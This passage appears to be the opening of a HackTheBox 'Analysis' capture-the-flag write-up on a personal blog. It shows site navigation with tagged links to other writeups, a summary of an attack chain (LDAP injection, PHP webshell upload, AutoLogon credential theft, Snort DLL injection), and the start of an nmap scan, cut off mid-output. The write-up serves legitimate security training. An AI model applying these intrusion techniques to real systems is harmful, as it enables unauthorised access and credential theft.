@@ -1,0 +1,2434 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset='utf-8'>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="index, follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
+    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
+    crossorigin="anonymous"></script>
+  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+  <link rel="stylesheet" href="/assets/css/style.css?v=18d79529ed1a410777646c1aaed0e478c964ecf8">
+  <link rel="stylesheet" href="/assets/css/prism.css">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
+  
+  <meta name="theme-color" content="#000000" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Analysis Writeup | Gabriel blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="HTB Analysis Writeup" />
+<meta name="author" content="gabri47" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Analysis is a hard machine of HackTheBox in which we have to do the following things. First, we have to enumerate files and directories recursively with a tool like feroxbuster. Then, I will abuse LDAP injection to see the password of a user in the description with a python script. Also, we can abuse a php upload vulnerability to gain access to the system as svc_web. Later, we can see saved credentials in AutoLogon to have access as jdoe. Finally, we can abuse a DLL injection in Snort dynamic preprocessor that Administrator will execute and we gain access as him." />
+<meta property="og:description" content="Analysis is a hard machine of HackTheBox in which we have to do the following things. First, we have to enumerate files and directories recursively with a tool like feroxbuster. Then, I will abuse LDAP injection to see the password of a user in the description with a python script. Also, we can abuse a php upload vulnerability to gain access to the system as svc_web. Later, we can see saved credentials in AutoLogon to have access as jdoe. Finally, we can abuse a DLL injection in Snort dynamic preprocessor that Administrator will execute and we gain access as him." />
+<link rel="canonical" href="http://localhost:4000/writeups/HTB/Analysis.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/HTB/Analysis.html" />
+<meta property="og:site_name" content="Gabriel blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-06-05T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Analysis Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-06-05T00:00:00+02:00","datePublished":"2024-06-05T00:00:00+02:00","description":"Analysis is a hard machine of HackTheBox in which we have to do the following things. First, we have to enumerate files and directories recursively with a tool like feroxbuster. Then, I will abuse LDAP injection to see the password of a user in the description with a python script. Also, we can abuse a php upload vulnerability to gain access to the system as svc_web. Later, we can see saved credentials in AutoLogon to have access as jdoe. Finally, we can abuse a DLL injection in Snort dynamic preprocessor that Administrator will execute and we gain access as him.","headline":"HTB Analysis Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/HTB/Analysis.html"},"url":"http://localhost:4000/writeups/HTB/Analysis.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+</head>
+
+<body>
+
+  <div id="header">
+    <div class="container">
+      <div class="title-container">
+        <a id="a-title" href="/">
+          <h1>Gabriel blog</h1>
+        </a>
+        <small class="nav-main d-flex justify-content-center">
+    
+    <a href = "/writeups">Writeups</a>
+    
+    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
+    
+    
+    <a href = "/blog">Blog</a>
+    
+    
+</small>
+
+      </div>
+      <br>
+
+      
+      
+<nav class="navbar navlinks">
+    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
+        <span>HTB Writeups</span>
+        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
+    </button>
+
+    <div class="navbar-collapse collapse" id="navbarSupportedContent">
+        <div class="m-1 mt-2">
+
+            
+            
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Blurry.html"> HTB Blurry writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;clearml/&gt; &lt;machine-learning/&gt; &lt;CVE-2024-24590/&gt; &lt;pickle/&gt; &lt;deserialization/&gt; &lt;python-torch/&gt; &lt;sudoers/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Freelancer.html"> HTB Freelancer writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;forgot-password/&gt; &lt;idor/&gt; &lt;qrcode/&gt; &lt;mssql/&gt; &lt;xp_cmdshell/&gt; &lt;sql-configuration/&gt; &lt;crash-dump-analysis/&gt; &lt;active-directory-acls/&gt; &lt;genericwrite/&gt; &lt;nt-hashes/&gt; &lt;secretsdump/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Boardlight.html"> HTB Boardlight writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;dolibarr/&gt; &lt;CVE-2023-30253/&gt; &lt;subdomain-enumeration/&gt; &lt;crm/&gt; &lt;erp/&gt; &lt;php-injection/&gt; &lt;php-configuration/&gt; &lt;mysql/&gt; &lt;password-reuse/&gt; &lt;suid/&gt; &lt;enlightenment/&gt; &lt;CVE-2022-37706/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Solarlab.html"> HTB Solarlab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;smb/&gt; &lt;spreadsheet/&gt; &lt;libreoffice/&gt; &lt;bruteforcing-web/&gt; &lt;rce/&gt; &lt;CVE-2023-33733/&gt; &lt;pdf/&gt; &lt;openfire-exploit/&gt; &lt;CVE-2023-32315/&gt; &lt;openfire-database/&gt; &lt;decrypt-password/&gt; &lt;java/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Intuition.html"> HTB Intuition writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;cookie-hijacking/&gt; &lt;cve-2023-24329/&gt; &lt;urllib/&gt; &lt;ssrf/&gt; &lt;ssrf-to-lfi/&gt; &lt;url-wrappers/&gt; &lt;ftp/&gt; &lt;ssh-key/&gt; &lt;ssh-key-comments/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;binary-analysis/&gt; &lt;suricata-logs/&gt; &lt;sudoers/&gt; &lt;ghidra/&gt; &lt;command-execution/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Mailing.html"> HTB Mailing writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;hMailServer/&gt; &lt;hMailServer-configuration/&gt; &lt;hash-cracking/&gt; &lt;outlook-vulnerabilities/&gt; &lt;CVE-2024-21413/&gt; &lt;ntlm-hash/&gt; &lt;libreoffice-odt-exploit/&gt; &lt;CVE-2023-2255/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Skyfall.html"> HTB Skyfall writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;forbidden-bypass/&gt; &lt;minio-cloud/&gt; &lt;minio-cve/&gt; &lt;CVE-2023-28432/&gt; &lt;hashicorp-vault/&gt; &lt;vault-ssh/&gt; &lt;sudoers/&gt; &lt;vault-unseal/&gt; &lt;race-condition/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Runner.html"> HTB Runner writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;teamcity/&gt; &lt;cve-2023-42793/&gt; &lt;teamcity-api/&gt; &lt;teamcity-rce/&gt; &lt;hsql/&gt; &lt;bcrypt/&gt; &lt;hash-cracking/&gt; &lt;id_rsa/&gt; &lt;portainer/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/FormulaX.html"> HTB FormulaX writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;websocket/&gt; &lt;simple-git-cve/&gt; &lt;CVE-2022-24066/&gt; &lt;mongodb/&gt; &lt;hash-cracking/&gt; &lt;librenms/&gt; &lt;librenms-abuse-template/&gt; &lt;laravel-blade/&gt; &lt;php/&gt; &lt;env-creds/&gt; &lt;sudoers/&gt; &lt;libreoffice-server-abuse/&gt; &lt;apache-uno-api/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Usage.html"> HTB Usage writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;sql-injection/&gt; &lt;boolean-based-sql-injection/&gt; &lt;hash-cracking/&gt; &lt;upload-vulnerabilities/&gt; &lt;monit/&gt; &lt;sudoers/&gt; &lt;abuse-symlinks/&gt; &lt;zip/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/IClean.html"> HTB IClean writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;ssti/&gt; &lt;sql/&gt; &lt;password-reuse/&gt; &lt;qpdf/&gt; &lt;sudoers/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/WifineticTwo.html"> HTB WifineticTwo writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;openplc/&gt; &lt;cve-2021-31630/&gt; &lt;wifi-scanning/&gt; &lt;pixiedust/&gt; &lt;port-scanning/&gt; &lt;ssh/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Headless.html"> HTB Headless writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;command-injection/&gt; &lt;sudoers/&gt; &lt;path-hijacking-.//&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Corporate.html"> HTB Corporate writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;bypass-csp/&gt; &lt;cookie-hijacking/&gt; &lt;idor/&gt; &lt;vpn/&gt; &lt;password-spraying/&gt; &lt;.mozilla-enumeration/&gt; &lt;bruteforce-bitwarden-pin/&gt; &lt;source-code-analysis/&gt; &lt;cookie-forging/&gt; &lt;jwt/&gt; &lt;docker-privesc/&gt; &lt;abupve/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Perfection.html"> HTB Perfection writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;ssti/&gt; &lt;ruby/&gt; &lt;crlf-injection/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;sudo-group/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Jab.html"> HTB Jab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xmpp/&gt; &lt;xmpp-user-enumeration/&gt; &lt;asreproast/&gt; &lt;hash-cracking/&gt; &lt;executedcom/&gt; &lt;dcomexec.py/&gt; &lt;openfire-rce/&gt; &lt;CVE-2023-32315/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Office.html"> HTB Office writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla-information-disclosure/&gt; &lt;CVE-2023-23752/&gt; &lt;smb-enumeration/&gt; &lt;pcap-tcp-packet-analysis/&gt; &lt;wireshark/&gt; &lt;krb-hash/&gt; &lt;joomla-rce/&gt; &lt;runascs/&gt; &lt;password-reuse/&gt; &lt;port-forwading/&gt; &lt;libreoffice-odt-exploitation/&gt; &lt;CVE-2023-2255/&gt; &lt;dpapi-creds/&gt; &lt;mimikatz/&gt; &lt;bloodhound/&gt; &lt;modifying-group-policy/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Crafty.html"> HTB Crafty writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;minecraft/&gt; &lt;log4j/&gt; &lt;jdgui/&gt; &lt;analyzing-jar/&gt; &lt;minecraft-plugins/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Pov.html"> HTB Pov Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;web.config/&gt; &lt;deserialization/&gt; &lt;exploiting-viewstate/&gt; &lt;decrypting-securestring/&gt; &lt;sedebugprivilege/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Analysis.html"> HTB Analysis Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Bizness.html"> HTB Bizness Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Ouija.html"> HTB Ouija Writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Monitored.html"> HTB Monitored Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Napper.html"> HTB Napper Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Devvortex.html"> HTB Devvortex Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Surveillance.html"> HTB Surveillance writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Hospital.html"> HTB Hospital Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/HTB/Codify.html"> HTB Codify Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+      
+      <div id="bottom-bar">
+        <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+      </div>
+    </div>
+  </div>
+
+  <div id="content" class="container">
+    <section id="main_content">
+      <h5 class="mt-0 mb-2">
+        
+        
+          HTB
+        
+        
+      </h5>
+    
+      <h1 class="d-flex w-100 justify-content-between">
+        
+        
+          <span>HTB Analysis Writeup</span> <span class="points"> [40 pts] </span>
+        
+        
+      </h1>
+
+
+<script>
+
+</script>
+
+<p>Analysis is a hard machine of HackTheBox in which we have to do the following things. First, we have to enumerate files and directories recursively with a tool like feroxbuster. Then, I will abuse LDAP injection to see the password of a user in the description with a python script. Also, we can abuse a php upload vulnerability to gain access to the system as svc_web. Later, we can see saved credentials in AutoLogon to have access as jdoe. Finally, we can abuse a DLL injection in Snort dynamic preprocessor that Administrator will execute and we gain access as him.</p>
+    
+      <h1 id="enumeration">
+        
+        
+          Enumeration <a href="#enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+    
+      <h2 id="port-scanning">
+        
+        
+          Port scanning <a href="#port-scanning" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:</p>
+
+<pre><code class="language-bash">❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.250
+# Nmap 7.94SVN scan initiated Wed Jun  5 22:04:01 2024 as: nmap -p- --open -sSVC --min-rate 5000 -v -n -Pn -oN tcpTargeted 10.10.11.250
+Nmap scan report for 10.10.11.250
+Host is up (0.047s latency).
+Not shown: 65445 closed tcp ports (reset), 61 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-05 20:04:24Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3306/tcp  open  mysql         MySQL (unauthorized)
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, afp: 
+|     Invalid message"
+|     HY000
+|   LDAPBindReq: 
+|     *Parse error unserializing protobuf message"
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame."
+|_    HY000
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49678/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49686/tcp open  msrpc         Microsoft Windows RPC
+49713/tcp open  msrpc         Microsoft Windows RPC
+49950/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.94SVN%I=7%D=6/5%Time=6660C4CC%P=x86_64-pc-linux-gnu%r
+SF:(GenericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\
+SF:0\0\x0b\x08\x05\x1a\0")%r(HTTPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
+SF:%r(RTSPRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0
+SF:\0\x0b\x08\x05\x1a\0")%r(DNSVersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05
+SF:\x1a\0")%r(DNSStatusRequestTCP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0
+SF:\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Help,9
